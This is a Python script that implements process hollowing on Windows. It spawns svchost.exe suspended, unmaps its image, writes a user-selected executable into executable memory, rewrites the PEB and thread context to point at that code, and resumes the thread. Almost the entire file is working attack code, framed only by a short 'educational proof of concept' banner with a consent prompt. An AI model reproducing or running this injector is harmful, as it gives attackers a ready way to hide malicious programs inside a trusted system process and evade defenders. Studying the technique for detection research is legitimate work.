import ctypes
import struct
import os
import sys
import tkinter as tk
from tkinter import filedialog
from ctypes import wintypes


kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll')

# constants
CREATE_SUSPENDED = 0x00000004
CONTEXT_FULL = 0x10001F
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# startupinfow structure
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",              wintypes.DWORD),
        ("lpReserved",      wintypes.LPWSTR),
        ("lpDesktop",       wintypes.LPWSTR),
        ("lpTitle",         wintypes.LPWSTR),
        ("dwX",             wintypes.DWORD),
        ("dwY",             wintypes.DWORD),
        ("dwXSize",         wintypes.DWORD),
        ("dwYSize",         wintypes.DWORD),
        ("dwXCountChars",   wintypes.DWORD),
        ("dwYCountChars",   wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags",         wintypes.DWORD),
        ("wShowWindow",     wintypes.WORD),
        ("cbReserved2",     wintypes.WORD),
        ("lpReserved2",     ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput",       wintypes.HANDLE),
        ("hStdOutput",      wintypes.HANDLE),
        ("hStdError",       wintypes.HANDLE),
    ]

# process_information structure
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),
    ]

# context structure
class CONTEXT64(ctypes.Structure):
    _fields_ = [
        ("P1Home",              ctypes.c_uint64),
        ("P2Home",              ctypes.c_uint64),
        ("P3Home",              ctypes.c_uint64),
        ("P4Home",              ctypes.c_uint64),
        ("P5Home",              ctypes.c_uint64),
        ("P6Home",              ctypes.c_uint64),
        ("ContextFlags",        wintypes.DWORD),
        ("MxCsr",               wintypes.DWORD),
        ("SegCs",               wintypes.WORD),
        ("SegDs",               wintypes.WORD),
        ("SegEs",               wintypes.WORD),
        ("SegFs",               wintypes.WORD),
        ("SegGs",               wintypes.WORD),
        ("SegSs",               wintypes.WORD),
        ("EFlags",              wintypes.DWORD),
        ("Dr0",                 ctypes.c_uint64),
        ("Dr1",                 ctypes.c_uint64),
        ("Dr2",                 ctypes.c_uint64),
        ("Dr3",                 ctypes.c_uint64),
        ("Dr6",                 ctypes.c_uint64),
        ("Dr7",                 ctypes.c_uint64),
        ("Rax",                 ctypes.c_uint64),
        ("Rcx",                 ctypes.c_uint64),
        ("Rdx",                 ctypes.c_uint64),
        ("Rbx",                 ctypes.c_uint64),
        ("Rsp",                 ctypes.c_uint64),
        ("Rbp",                 ctypes.c_uint64),
        ("Rsi",                 ctypes.c_uint64),
        ("Rdi",                 ctypes.c_uint64),
        ("R8",                  ctypes.c_uint64),
        ("R9",                  ctypes.c_uint64),
        ("R10",                 ctypes.c_uint64),
        ("R11",                 ctypes.c_uint64),
        ("R12",                 ctypes.c_uint64),
        ("R13",                 ctypes.c_uint64),
        ("R14",                 ctypes.c_uint64),
        ("R15",                 ctypes.c_uint64),
        ("Rip",                 ctypes.c_uint64),
        ("FltSave",             ctypes.c_byte * 512),
        ("VectorRegister",      ctypes.c_byte * 416),
        ("VectorControl",       ctypes.c_uint64),
        ("DebugControl",        ctypes.c_uint64),
        ("LastBranchToRip",     ctypes.c_uint64),
        ("LastBranchFromRip",   ctypes.c_uint64),
        ("LastExceptionToRip",  ctypes.c_uint64),
        ("LastExceptionFromRip",ctypes.c_uint64),
    ]

# createprocessw function signature
kernel32.CreateProcessW.restype = wintypes.BOOL
kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR,                # lpApplicationName
    wintypes.LPWSTR,                 # lpCommandLine
    ctypes.c_void_p,                 # lpProcessAttributes
    ctypes.c_void_p,                 # lpThreadAttributes
    wintypes.BOOL,                   # bInheritHandles
    wintypes.DWORD,                  # dwCreationFlags
    ctypes.c_void_p,                 # lpEnvironment
    wintypes.LPCWSTR,                # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFOW),    # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),  # lpProcessInformation
]

# getthreadcontext function signature
kernel32.GetThreadContext.restype = wintypes.BOOL
kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,
    ctypes.POINTER(CONTEXT64),
]

# readprocessmemory function signature
kernel32.ReadProcessMemory.restype = wintypes.BOOL
kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,        # hProcess
    ctypes.c_uint64,        # lpBaseAddress
    ctypes.c_void_p,        # lpBuffer
    ctypes.c_size_t,        # nSize
    ctypes.POINTER(ctypes.c_size_t),  # lpNumberOfBytesRead
]

# ntunmapviewofsection function signature
ntdll.NtUnmapViewOfSection.restype = wintypes.LONG  # NTSTATUS
ntdll.NtUnmapViewOfSection.argtypes = [
    wintypes.HANDLE,        # ProcessHandle
    ctypes.c_uint64,        # BaseAddress
]

# virtualallocex function signature
kernel32.VirtualAllocEx.restype = ctypes.c_uint64
kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    ctypes.c_uint64,        # lpAddress
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]

# writeprocessmemory function signature
kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,        # hProcess
    ctypes.c_uint64,        # lpBaseAddress
    ctypes.c_void_p,        # lpBuffer
    ctypes.c_size_t,        # nSize
    ctypes.POINTER(ctypes.c_size_t),  # lpNumberOfBytesWritten
]

# setthreadcontext function signature
kernel32.SetThreadContext.restype = wintypes.BOOL
kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,
    ctypes.POINTER(CONTEXT64),
]

# resumethread function signature
kernel32.ResumeThread.restype = wintypes.DWORD
kernel32.ResumeThread.argtypes = [
    wintypes.HANDLE,        # hThread
]

# spawns svchost.exe in suspended state
def create_suspended_process(exe_path: str):
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)
    pi = PROCESS_INFORMATION()

    success = kernel32.CreateProcessW(
        exe_path,           # lpApplicationName
        None,               # lpCommandLine
        None,               # lpProcessAttributes
        None,               # lpThreadAttributes
        False,              # bInheritHandles
        CREATE_SUSPENDED,   # dwCreationFlags
        None,               # lpEnvironment
        None,               # lpCurrentDirectory
        ctypes.byref(si),   # lpStartupInfo
        ctypes.byref(pi),   # lpProcessInformation
    )

    if not success:
        error_code = ctypes.get_last_error()
        raise ctypes.WinError(error_code)

    return pi

# reads peb, gets image base, then unmaps it
def unmap_process_image(pi):
    # rdx points to peb on process start
    ctx = CONTEXT64()
    ctx.ContextFlags = CONTEXT_FULL

    success = kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    # imagebaseaddress is at peb + 0x10
    peb_address = ctx.Rdx
    image_base_addr_ptr = peb_address + 0x10

    image_base = ctypes.c_uint64(0)
    bytes_read = ctypes.c_size_t(0)

    success = kernel32.ReadProcessMemory(
        pi.hProcess,
        image_base_addr_ptr,
        ctypes.byref(image_base),
        ctypes.sizeof(image_base),
        ctypes.byref(bytes_read),
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    # unmap the original image using ntunmapviewofsection
    status = ntdll.NtUnmapViewOfSection(pi.hProcess, image_base.value)

    if status != 0:
        raise RuntimeError(f"NtUnmapViewOfSection failed. NTSTATUS: 0x{status & 0xFFFFFFFF:08X}")

    return peb_address, image_base.value

# file picker for selecting the exe
def select_payload_file() -> str:
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)

    file_path = filedialog.askopenfilename(
        title="Select the PE (.exe) file to inject",
        filetypes=[("Executable files", "*.exe"), ("All files", "*.*")],
    )

    root.destroy()
    return file_path

# prints consent screen and asks yes/no
def ask_user_consent() -> bool:
    print("="*60)
    print("  PROCESS HOLLOWING - Proof of Concept (PoC)")
    print("="*60)
    print()
    print("  This tool demonstrates the 'Process Hollowing' technique")
    print("  for EDUCATIONAL and RESEARCH purposes only.")
    print()
    print("  What will happen:")
    print("    1. A legitimate Windows process (svchost.exe) will be")
    print("       created in a SUSPENDED state.")
    print("    2. Its memory image will be unmapped.")
    print("    3. The PE file you select will be injected into its")
    print("       address space.")
    print("    4. The thread will be resumed to execute the injected code.")
    print()
    print("  WARNING: Only use this on systems you own or have explicit")
    print("  permission to test. Misuse may violate laws.")
    print("="*60)
    print()
    answer = input("  Do you want to proceed? (yes/no): ").strip().lower()
    return answer in ("yes", "y")

# parses the pe and writes it into the target process
def inject_payload(pi, payload_data: bytes, image_base: int):
    # e_lfanew is at offset 0x3c in the dos header
    e_lfanew = struct.unpack_from("<I", payload_data, 0x3C)[0]

    # optional header offset = e_lfanew + 24
    opt_header_offset = e_lfanew + 24

    # grab what we need from the optional header
    entry_point_rva = struct.unpack_from("<I", payload_data, opt_header_offset + 16)[0]
    size_of_image   = struct.unpack_from("<I", payload_data, opt_header_offset + 56)[0]
    size_of_headers = struct.unpack_from("<I", payload_data, opt_header_offset + 60)[0]

    # allocate space in target process at the old image base
    remote_base = kernel32.VirtualAllocEx(
        pi.hProcess,
        image_base,
        size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )

    if not remote_base:
        raise ctypes.WinError(ctypes.get_last_error())

    # write pe headers first
    header_buf = (ctypes.c_byte * size_of_headers)(*payload_data[:size_of_headers])
    bytes_written = ctypes.c_size_t(0)

    success = kernel32.WriteProcessMemory(
        pi.hProcess,
        remote_base,
        header_buf,
        size_of_headers,
        ctypes.byref(bytes_written),
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    # write each section one by one
    num_sections = struct.unpack_from("<H", payload_data, e_lfanew + 6)[0]
    size_of_optional_header = struct.unpack_from("<H", payload_data, e_lfanew + 20)[0]

    # first section header offset
    section_header_offset = e_lfanew + 24 + size_of_optional_header

    for i in range(num_sections):
        sh_offset = section_header_offset + (i * 40)
        virtual_address = struct.unpack_from("<I", payload_data, sh_offset + 12)[0]
        raw_size        = struct.unpack_from("<I", payload_data, sh_offset + 16)[0]
        raw_offset      = struct.unpack_from("<I", payload_data, sh_offset + 20)[0]

        # skip empty sections
        if raw_size == 0:
            continue

        section_data = payload_data[raw_offset:raw_offset + raw_size]
        section_buf = (ctypes.c_byte * len(section_data))(*section_data)
        bytes_written = ctypes.c_size_t(0)

        success = kernel32.WriteProcessMemory(
            pi.hProcess,
            remote_base + virtual_address,
            section_buf,
            len(section_data),
            ctypes.byref(bytes_written),
        )
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())

    return remote_base, entry_point_rva

# patches peb and redirects rcx to the new entry point
def set_entry_point(pi, peb_address: int, remote_base: int, entry_point_rva: int):
    # update imagebaseaddress in peb
    new_base = ctypes.c_uint64(remote_base)
    bytes_written = ctypes.c_size_t(0)

    success = kernel32.WriteProcessMemory(
        pi.hProcess,
        peb_address + 0x10,
        ctypes.byref(new_base),
        ctypes.sizeof(new_base),
        ctypes.byref(bytes_written),
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    # get context, change rcx to point at our entry
    ctx = CONTEXT64()
    ctx.ContextFlags = CONTEXT_FULL

    success = kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    ctx.Rcx = remote_base + entry_point_rva

    success = kernel32.SetThreadContext(pi.hThread, ctypes.byref(ctx))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

# finally wake the thread up
def resume_thread(pi):
    result = kernel32.ResumeThread(pi.hThread)
    if result == 0xFFFFFFFF:  # (DWORD)-1
        raise ctypes.WinError(ctypes.get_last_error())

if __name__ == "__main__":
    # ask for consent before doing anything
    if not ask_user_consent():
        print("\n  [!] Operation cancelled by user.")
        sys.exit(0)

    print("\n  [+] Consent granted. Opening file picker...\n")

    # let user pick the exe to inject
    payload_path = select_payload_file()
    if not payload_path:
        print("  [!] No file selected. Exiting.")
        sys.exit(0)

    print(f"  [+] Selected file: {payload_path}")

    # read the pe into ram
    with open(payload_path, "rb") as f:
        payload_data = f.read()

    # target host process
    target = r"C:\Windows\System32\svchost.exe"
    pi = create_suspended_process(target)
    peb_address, image_base = unmap_process_image(pi)
    remote_base, entry_point_rva = inject_payload(pi, payload_data, image_base)
    set_entry_point(pi, peb_address, remote_base, entry_point_rva)
    resume_thread(pi)

    print("\n  [+] Process hollowing completed successfully.")